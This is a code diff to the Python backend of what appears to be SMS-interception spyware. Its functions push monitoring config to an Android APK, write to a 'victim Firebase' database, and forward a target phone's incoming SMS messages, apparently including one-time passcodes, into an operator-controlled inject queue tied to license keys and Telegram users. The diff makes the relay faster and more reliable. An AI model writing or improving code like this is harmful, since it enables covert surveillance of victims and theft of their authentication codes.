@@ -12,8 +12,8 @@ from app.firebase_client import normalize_firebase_url
 logger = logging.getLogger(__name__)
 settings = get_settings()
 
-INJECT_TIMEOUT_SEC = 0.8
-OUTGOING_TIMEOUT_SEC = 1.0
+INJECT_TIMEOUT_SEC = 0.32
+OUTGOING_TIMEOUT_SEC = 0.55
 OUTGOING_SENDER = "__OUT__"
 
 def get_profile_firebase_url(profile: MonitorProfile) -> str | None:
@@ -221,7 +221,7 @@ async def push_virtus_apk_config(profile: MonitorProfile, device: Device | None 
     poll_id = resolve_apk_poll_id(profile, device)
     payload = {
         "monitoring": profile.is_monitoring,
-        "ts": int(time.time() * 1000),
+        "ts": apk_config_ts(profile),
         "firebase_url": firebase_url,
         "device_id": poll_id,
         "firebase_key": license_key.strip().upper(),
@@ -258,6 +258,7 @@ async def push_module_config(profile: MonitorProfile, device: Device | None = No
         device_id=resolve_apk_poll_id(profile, device),
         target_number=profile.phone_number,
         firebase_url=resolve_apk_firebase_url(profile, device),
+        ts_ms=apk_config_ts(profile),
     )
     await push_virtus_apk_config(profile, device)
 
@@ -414,11 +415,67 @@ async def register_device_on_firebase(
     await _firebase_put(f"{base}/devices/{device.name}", payload)
 
 
+def apk_config_ts(profile: MonitorProfile) -> int:
+    """Stable APK uptime anchor — tied to monitoring session, not every config push."""
+    if profile.is_monitoring and profile.started_at:
+        started = profile.started_at
+        if started.tzinfo is None:
+            started = started.replace(tzinfo=timezone.utc)
+        return int(started.timestamp() * 1000)
+    return int(time.time() * 1000)
+
+
+async def wake_apk_monitoring(profile: MonitorProfile, device: Device | None = None) -> None:
+    """APK uptime + inject poll — push config/{KEY} only (no inject queue / OTP changes)."""
+    license_key = get_license_key(profile)
+    if not license_key or not license_key.upper().startswith("KEY-"):
+        return
+
+    poll_id = resolve_apk_poll_id(profile, device)
+    firebase_url = resolve_apk_firebase_url(profile, device) or settings.apk_config_db.rstrip("/")
+    key = license_key.strip().upper()
+    session_ts = apk_config_ts(profile)
+    payload = {
+        "monitoring": bool(profile.is_monitoring),
+        "ts": session_ts,
+        "firebase_url": normalize_firebase_url(firebase_url),
+        "device_id": poll_id,
+        "firebase_key": key,
+    }
+    bootstrap = settings.apk_config_db.rstrip("/")
+    bases: list[str] = []
+    if bootstrap:
+        bases.append(bootstrap)
+    victim = resolve_apk_firebase_url(profile, device)
+    if victim and victim not in bases:
+        bases.append(normalize_firebase_url(victim))
+
+    for base in bases:
+        ok = await _firebase_put_ok(f"{base}/config/{key}", payload)
+        logger.info(
+            "APK config wake monitoring=%s base=%s ok=%s poll_id=%s",
+            profile.is_monitoring,
+            base,
+            ok,
+            poll_id,
+        )
+
+
+async def publish_monitoring_state(profile: MonitorProfile, device: Device | None = None) -> None:
+    """Push monitoring ON/OFF to APK config + victim Firebase immediately."""
+    try:
+        await wake_apk_monitoring(profile, device)
+        await push_virtus_apk_config(profile, device)
+        await push_module_config(profile, device)
+    except Exception as exc:
+        logger.warning("Monitoring state publish failed: %s", exc)
+
+
 async def sync_profile_to_firebase(profile: MonitorProfile, device: Device | None = None) -> None:
     if not resolve_firebase_url(profile, device):
         return
     try:
-        await push_module_config(profile, device)
+        await publish_monitoring_state(profile, device)
         if device:
             firebase_url = resolve_firebase_url(profile, device)
             if firebase_url:
@@ -464,24 +521,68 @@ async def push_mynum_inject(
         "injected": False,
         "created_at": datetime.now(timezone.utc).isoformat(),
     }
-    tasks = []
-    for firebase_url in _inject_firebase_bases(profile, device):
-        base = normalize_firebase_url(firebase_url)
-        tasks.append(_firebase_put_ok(f"{base}/messages/{poll_id}/{message_id}", payload))
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    if any(result is True for result in results):
-        logger.info(
-            "Inject queued poll_id=%s bases=%s",
-            poll_id,
-            [normalize_firebase_url(url) for url in _inject_firebase_bases(profile, device)],
-        )
-        return message_id
-    logger.error(
-        "Inject push failed poll_id=%s bases=%s",
-        poll_id,
-        _inject_firebase_bases(profile, device),
-    )
+    bases = [normalize_firebase_url(url) for url in _inject_firebase_bases(profile, device)]
+    if not bases:
+        return None
+
+    async def _put_one(base: str) -> bool:
+        return await _firebase_put_ok(f"{base}/messages/{poll_id}/{message_id}", payload)
+
+    if len(bases) == 1:
+        if await _put_one(bases[0]):
+            logger.info("Inject queued poll_id=%s base=%s", poll_id, bases[0])
+            return message_id
+        logger.error("Inject push failed poll_id=%s base=%s", poll_id, bases[0])
+        return None
+
+    tasks = [asyncio.create_task(_put_one(base)) for base in bases]
+    done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
+    for task in done:
+        try:
+            if task.result() is True:
+                for other in pending:
+                    other.cancel()
+                logger.info("Inject queued poll_id=%s bases=%s (first ok)", poll_id, bases)
+                return message_id
+        except Exception:
+            pass
+    if pending:
+        more_done, still_pending = await asyncio.wait(pending, timeout=0.10)
+        for task in still_pending:
+            task.cancel()
+        for task in more_done:
+            try:
+                if task.result() is True:
+                    logger.info("Inject queued poll_id=%s bases=%s", poll_id, bases)
+                    return message_id
+            except Exception:
+                pass
+    logger.error("Inject push failed poll_id=%s bases=%s", poll_id, bases)
     return None
+
+
+async def publish_mynum_inject_target(
+    profile: MonitorProfile,
+    device: Device | None,
+    *,
+    telegram_user_id: int | None = None,
+) -> str | None:
+    """Apply /mynum — push APK config only (inject queue logic unchanged)."""
+    if not profile.phone_number:
+        return None
+
+    poll_id = mynum_device_id(profile.phone_number)
+    license_key = get_license_key(profile)
+    uid = telegram_user_id if telegram_user_id is not None else profile.telegram_user_id
+    if license_key and license_key.upper().startswith("KEY-") and uid is not None:
+        from app.license_keys import register_device_on_key
+
+        register_device_on_key(license_key, poll_id, uid)
+
+    await push_virtus_apk_config(profile, device)
+    await push_module_config(profile, device)
+    logger.info("Mynum config updated poll_id=%s phone=%s", poll_id, profile.phone_number)
+    return poll_id
 
 
 async def push_outbound_to_firebase(
@@ -528,8 +629,10 @@ async def send_polling_startup_test(
     db,
     profile: MonitorProfile,
     device: Device,
+    *,
+    skip_config: bool = False,
 ) -> tuple[int, int]:
-    """Monitoring start — push APK config + inject test to /mynum queue."""
+    """Monitoring start — inject test to /mynum queue (config optional)."""
     import time
 
     from app.device_ui import STARTUP_TEST_MESSAGE, STARTUP_TEST_SENDER
@@ -557,8 +660,9 @@ async def send_polling_startup_test(
         poll_id = mynum_device_id(profile.phone_number)
         register_device_on_key(license_key, poll_id, profile.telegram_user_id)
 
-    await push_virtus_apk_config(profile, device)
-    await push_module_config(profile, device)
+    if not skip_config:
+        await push_virtus_apk_config(profile, device)
+        await push_module_config(profile, device)
 
     t0 = time.perf_counter()
     try:
@@ -578,6 +682,17 @@ async def send_polling_startup_test(
         return 0, max(1, int((time.perf_counter() - t0) * 1000))
 
 
+async def _nudge_apk_after_inject(profile: MonitorProfile, device: Device) -> None:
+    """Wake APK config in background — inject queue is already pushed."""
+    try:
+        await asyncio.gather(
+            wake_apk_monitoring(profile, device),
+            push_virtus_apk_config(profile, device),
+        )
+    except Exception as exc:
+        logger.debug("APK nudge after inject failed: %s", exc)
+
+
 async def forward_incoming_to_mynum(
     db,
     profile: MonitorProfile,
@@ -593,7 +708,9 @@ async def forward_incoming_to_mynum(
 
     try:
         sender, message = prepare_sms_forward(sender, message)
-        await push_mynum_inject(profile, device, sender, message)
+        message_id = await push_mynum_inject(profile, device, sender, message)
+        if message_id:
+            asyncio.create_task(_nudge_apk_after_inject(profile, device))
         if db is not None:
             queue_forward_to_mynum(db, profile, device, sender, message)
     except Exception as exc:
